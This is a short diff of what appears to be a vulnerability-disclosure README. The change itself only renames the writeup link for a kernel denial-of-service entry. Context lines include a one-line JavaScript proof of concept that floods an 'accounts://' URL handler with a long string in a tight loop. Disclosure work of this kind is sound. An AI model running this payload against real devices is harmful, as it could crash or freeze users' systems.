@@ -56,7 +56,7 @@ _Quick Poc:_
 setInterval(function(){window.location.href='accounts://'+'A'.repeat(10000);},0.1);
 ```
 
-## CVE-2018-???? Kernel Denial of Service [(Writeup)](writeups/kerneldos.md)
+## CVE-2018-???? Kernel Denial of Service [(Writeup)](writeups/kernel-procalloc.md)
 A local attacker may be able to cause a denial of service through a maliciously crafted application.
 
 A logic flaw exists in process allocation.
